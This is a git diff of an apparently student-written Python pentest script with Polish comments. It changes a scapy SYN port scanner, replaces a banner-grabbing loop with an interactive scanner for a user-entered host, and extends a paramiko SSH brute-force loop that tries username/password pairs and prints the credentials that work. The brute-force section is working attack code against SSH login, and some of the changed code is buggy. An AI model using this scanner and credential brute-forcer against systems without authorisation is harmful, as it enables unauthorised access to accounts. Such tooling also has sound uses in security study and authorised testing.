@@ -59,14 +59,17 @@ for i in range(100, 105):
 print("4", "\n")
 cel = target_IP
 pakiet = IP(dst="google.com")/ICMP()/"Projekt"
-for port in range(21, 23):
+for port in range(1, 85): # poprawic wyswietlanie tylko istniejacych portow
+
     pakiet = IP(dst=cel)/TCP(dport=[port], flags = "S")
     rec, wrong = sr(pakiet, timeout=1, verbose=0) #timeout - dlugosc zycia, verbose - ilosc wyswietlanych inf zwrotnych 0 - 3
 
     if rec:
         usluga = "{}".format(str(str(rec[0]).split(" ")[7][6:]))
         dane = f"Port: {port} otwarty, usluga = {usluga}"
-        print(dane)
+        if str(port) != usluga:
+        # print(usluga != str(port))
+            print(dane)
     else:
         continue
 
@@ -76,21 +79,49 @@ print("5", "\n")
 import socket
 import sys
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Dopracowac wyswietlanie apache
 
 target = target_IP
 
-for port in range(21, 23):
-    try:
-        connection = s.connect((target, port))
-        print(f"[+] {target}: port {port} is OPEN")
-        s.send("Get banner \r\n".encode())
-        response = s.recv((2048)).decode()
-        print("Name and version service: ", response)
-    except:
-#        print(f"[-] {target}: port {port} is CLOSED")
-        pass
+# for port in range(20, 85):
+#     try:
+#         connection = s.connect((target, port))
+#         print(f"[+] {target}: port {port} is OPEN")
+#         s.send("Get banner \r\n".encode())
+#         response = s.recv((2048)).decode()
+#         print("Name and version service: ", response)
+#     except:
+# #        print(f"[-] {target}: port {port} is CLOSED")
+#         pass
+to_scan = input("Enter host IP to scan: ")
+to_scan_IP = socket.gethostbyname(to_scan)
 
+print("-" * 60)
+print("Please wait, scanning remote host", to_scan_IP)
+print("-" * 60)
+
+# ports limited to 100, for testing need the script to work faster
+try:
+    for port in range(1, 100):
+        package = IP(dst=to_scan) / TCP(dport=[port], flags="S")
+        rec, wrong = sr(package, timeout=1, verbose=0)
+        service = f"{str(rec[0]).split(' ')[7][6:]}"
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        result = sock.connect_ex((to_scan_IP, port))
+        if result == 0:
+            print("Port {}: Open".format(port), service)
+        sock.close()
+except KeyboardInterrupt:
+    print("You pressed Ctrl+C")
+    sys.exit()
+
+except socket.gaierror:
+    print('Hostname could not be resolved. Exiting')
+    sys.exit()
+
+except socket.error:
+    print("Couldn't connect to server")
+    sys.exit()
 ############################################ 6 - Brute Force ########################################
 print("6", "\n")
 import paramiko
@@ -111,8 +142,11 @@ for user in users:
             #print(f"[*] Trying> {user}:{password}", end="")
             ssh_server.connect(target, port, user, password)
             print(f" - SUCCESS")
-            print(f"Correct login and password: > {user}:{password}")
+            print(f"Correct login and password for SSH: > {user}:{password}")
             ssh_server.close()
+            if ssh_server.connect(target, port, user, password, timeout=20) == None:
+                print("stop")
+                sys.exit()
         except Exception as exc:
             # print("[-] Brute-force attack failed!")
             pass
